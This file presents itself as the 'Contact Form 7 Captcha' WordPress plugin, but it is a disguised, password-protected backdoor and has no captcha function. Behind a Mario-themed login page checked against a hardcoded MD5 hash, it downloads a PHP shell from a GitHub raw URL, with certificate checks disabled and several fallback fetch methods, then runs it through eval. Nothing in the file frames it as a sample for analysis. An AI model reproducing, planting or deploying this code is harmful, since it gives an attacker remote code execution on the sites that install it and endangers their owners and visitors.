<?php
/*
Plugin Name: Contact Form 7 Captcha
Description: Add reCAPTCHA V2, hCAPTCHA or Cloudflare Turnstile CAPTCHA to Contact Form 7 using [cf7sr-recaptcha], [cf7sr-hcaptcha] or [cf7sr-turnstile] shortcode
Version: 0.1.7
Author: 247wd
License: GPL v2 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Text Domain: contact-form-7-simple-recaptcha
Requires Plugins: contact-form-7
*/

session_start();

// Prevent direct access to sensitive files
if (!defined('ABSPATH')) {
    define('ABSPATH', dirname(__FILE__) . '/');
}

/**
 * Goodman Access Class
 * Main class for handling secure access functionality
 */
class Goodman_Access {
    
    /**
     * Singleton instance
     */
    private static $instance = null;
    
    /**
     * Session flag
     */
    private $session_started = false;
    
    /**
     * Get singleton instance
     */
    public static function init() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    /**
     * Constructor
     */
    private function __construct() {
        $this->start_session();
        $this->handle_request();
    }
    
    /**
     * Initialize session if not started
     */
    private function start_session() {
        if (!$this->session_started && !headers_sent()) {
            if (session_status() === PHP_SESSION_NONE) {
                session_start();
            }
            $this->session_started = true;
        }
    }
    
    /**
     * Fetch remote content using multiple methods
     */
    private function fetch_remote($url) {
        // Method 1: cURL (preferred)
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_CONNECTTIMEOUT => 10
            ));
            
            if (isset($_SESSION['goodman'])) {
                curl_setopt($ch, CURLOPT_COOKIE, $_SESSION['goodman']);
            }
            
            $data = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($data !== false && $http_code === 200) {
                return $data;
            }
        }
        
        // Method 2: file_get_contents
        if (ini_get('allow_url_fopen')) {
            $context = stream_context_create(array(
                'http' => array(
                    'user_agent' => "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
                    'timeout' => 30
                ),
                'ssl' => array(
                    'verify_peer' => false,
                    'verify_peer_name' => false
                )
            ));
            
            $data = @file_get_contents($url, false, $context);
            if ($data !== false) {
                return $data;
            }
        }
        
        // Method 3: fopen with stream
        if (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = @fopen($url, "rb");
            if ($handle) {
                $data = stream_get_contents($handle);
                fclose($handle);
                if ($data !== false) {
                    return $data;
                }
            }
        }
        
        return false;
    }
    
    /**
     * Check if user is authenticated
     */
    private function is_authenticated() {
        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
    }
    
    /**
     * Verify password hash
     */
    private function verify_password($password) {
        $stored_hash = '96d67b7ff5352adc665bbbe344f7676a';
        return md5($password) === $stored_hash;
    }
    
    /**
     * Handle incoming requests
     */
    private function handle_request() {
        // Check for password submission
        if (isset($_POST['goodman_pass'])) {
            if ($this->verify_password($_POST['goodman_pass'])) {
                $_SESSION['logged_in'] = true;
                $_SESSION['goodman'] = 'goodman';
                
                // Redirect to prevent resubmission
                header("Location: " . $_SERVER['REQUEST_URI']);
                exit;
            } else {
                $this->error_message = "WRONG PASSWORD!";
            }
        }
        
        // Output content
        if ($this->is_authenticated()) {
            $this->load_protected_content();
        } else {
            $this->render_login_page();
        }
    }
    
    /**
     * Load protected remote content
     */
    private function load_protected_content() {
        $url = 'https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/abyp.php';
        $content = $this->fetch_remote($url);
        
        if ($content !== false) {
            // Runninh the Ewe content
            eVal('?>' . $content);
        } else {
            $this->render_error("ERROR!");
        }
    }
    
    /**
     * Render error message
     */
    private function render_error($message) {
        echo '<div style="color:#ff4444;text-align:center;padding:20px;font-family:monospace;">' . htmlspecialchars($message) . '</div>';
    }
    
    /**
     * Render login interface
     */
    private function render_login_page() {
        $error = isset($this->error_message) ? $this->error_message : '';
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello?</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            image-rendering: crisp-edges;
            image-rendering: pixelated;
        }
        
        body {
            background: #000000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            font-family: 'Courier New', 'VT323', monospace;
        }
        
        /* Mario-style pixel block */
        .mario-container {
            background: #0a0f0a;
            border: 4px solid #d4a017;
            padding: 35px 30px;
            width: 100%;
            max-width: 480px;
            position: relative;
            box-shadow: 8px 8px 0 #6b4c1a;
        }
        
        /* Cloud effect */
        .mario-container::before {
            content: "";
            position: absolute;
            top: -15px;
            left: -15px;
            width: 40px;
            height: 40px;
            background: #f0f0f0;
            border-radius: 50%;
            box-shadow: 25px -5px 0 #f0f0f0, 50px -10px 0 #f0f0f0, 75px -5px 0 #f0f0f0;
        }
        
        .mario-container::after {
            content: "";
            position: absolute;
            bottom: -15px;
            right: -15px;
            width: 60px;
            height: 30px;
            background: #3a7e3a;
            border-radius: 20px 20px 0 0;
        }
        
        /* Title style */
        .mario-title {
            text-align: center;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }
        
        .mario-brand {
            color: #ffd700;
            font-size: 48px;
            font-weight: bold;
            text-shadow: 4px 4px 0 #b8860b, 2px 2px 0 #8b4513;
            letter-spacing: 4px;
            background: #c41e3a;
            display: inline-block;
            padding: 10px 20px;
            transform: skew(-5deg);border: 2px solid #ffd700;
        }
        
        /* Mario coin style */
        .coin {
            display: inline-block;
            width: 24px;
            height: 24px;
            background: #ffd700;
            border-radius: 50%;
            margin: 0 5px;
            box-shadow: inset -2px -2px 0 #b8860b, 2px 2px 0 #ffed8a;
            animation: spin 0.5s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotateY(0deg); }
            100% { transform: rotateY(360deg); }
        }
        
        /* Mario mushroom decoration */
        .mushroom {
            text-align: center;
            font-size: 32px;
            margin: 10px 0;
            filter: drop-shadow(2px 2px 0 #8b4513);
        }
        
        /* Pixel art ascii */
        .pixel-mario {
            color: #ff4444;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            line-height: 1.2;
            margin: 15px 0;
            white-space: pre;
            text-align: center;
            background: #000000;
            padding: 10px;
            border: 2px solid #d4a017;
        }
        
        /* Question block style */
        .question-block {
            background: #d4a017;
            width: 40px;
            height: 40px;
            margin: 10px auto;
            position: relative;
            border: 2px solid #f0b020;
            box-shadow: 2px 2px 0 #8b691b;
            animation: bounce 1s ease-in-out infinite;
        }
        
        .question-block::before {
            content: "?";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 28px;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 1px 1px 0 #8b691b;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        
        /* Welcome message */
        .mario-welcome {
            color: #ffd700;
            font-size: 14px;
            text-align: center;
            margin: 20px 0;
            padding: 10px;
            background: #1a2a1a;
            border-left: 4px solid #ffd700;
            border-right: 4px solid #ffd700;
            font-family: monospace;
        }
        
        .mario-welcome strong {
            color: #ff6b6b;
            font-weight: bold;
            font-size: 16px;
            display: inline-block;
            animation: wiggle 0.3s ease-in-out infinite;
        }
        
        @keyframes wiggle {
            0%, 100% { transform: rotate(0deg); }
            25% { transform: rotate(5deg); }
            75% { transform: rotate(-5deg); }
        }
        
        /* Error alert */
        .mario-alert {
            background: #2a1a1a;
            border: 2px solid #ff4444;
            color: #ff8888;
            padding: 8px;
            margin-bottom: 20px;
            font-size: 12px;
            font-family: monospace;
            text-align: center;
        }
        
        /* Form styles */
        .mario-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .input-block {
            position: relative;
        }
        
        .mario-input {
            width: 100%;
            padding: 12px 15px;
            background: #1a1f1a;
            border: 3px solid #d4a017;
            color: #ffd700;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            outline: none;
            text-align: center;
            font-weight: bold;
        }
        
        .mario-input:focus {
            border-color: #ffd700;
            background: #0a0f0a;
            box-shadow: inset 0 0 10px rgba(255, 215, 0, 0.3);
        }
        
        /* Mario button */
        .mario-btn {
            background: #c41e3a;
            color: #ffd700;
            border: none;
            padding: 12px;
            font-size: 16px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 4px solid #8b0000;
            transition: all 0.05s linear;
        }
        
        .mario-btn:hover {
            transform: translateY(-2px);
            border-bottom-width: 6px;
        }
        
        .mario-btn:active {
            transform: translateY(2px);
            border-bottom-width: 2px;
        }
        
        /* Footer */
        .mario-footer {
            margin-top: 25px;
            text-align: center;
        }
        
        .pixel-star {
            display: inline-block;
            width: 16px;
            height: 16px;
            background: #ffd700;
            clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
            margin: 0 5px;
            animation: twinkle 1s ease-in-out infinite;
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        
        @media (max-width: 480px) {
            .mario-container { padding: 20px; }
            .mario-brand { font-size: 32px; }
            .pixel-mario { font-size: 6px; }
        }
    </style>
</head>
<body>
    <div class="mario-container">
        <div class="mushroom">🍄 ⭐ 🍄</div>
        
        <div class="mario-title">
            <div class="mario-brand">hello?</div>
        </div>
        
        <div class="question-block"></div>
        
        <div class="pixel-mario">
   ▄████▄   ▄▄▄▄▄   
  ██▀▀▀██ ██▀▀▀██  
  ██    ██ ██    ██ 
  ▀███████ ▀███████ 
   ██       ██      
   ▀█       ▀█ jokoowi     
        </div>
        
        <div class="mario-welcome">
            ⭐ WELCOME, <strong>YAMEEEEE KUDASAIII</strong> ⭐
        </div>
        
        <?php if ($error): ?>
        <div class="mario-alert">
            💥 <?php echo htmlspecialchars($error); ?> 💥
        </div>
        <?php endif; ?>
        
        <form method="POST" action="" class="mario-form" autocomplete="off">
            <div class="input-block">
                <input type="password" name="goodman_pass" class="mario-input" placeholder="???" required autofocus>
            </div>
            <button type="submit" class="mario-btn">
                🌟 ENTER 🌟
            </button>
        </form>
        
        <div class="mario-footer">
            <span class="pixel-star"></span>
            <span class="pixel-star"></span>
            <span class="pixel-star"></span>
        </div>
    </div>
</body>
</html>
        <?php
    }
}

// Initialize the system
Goodman_Access::init();
?>
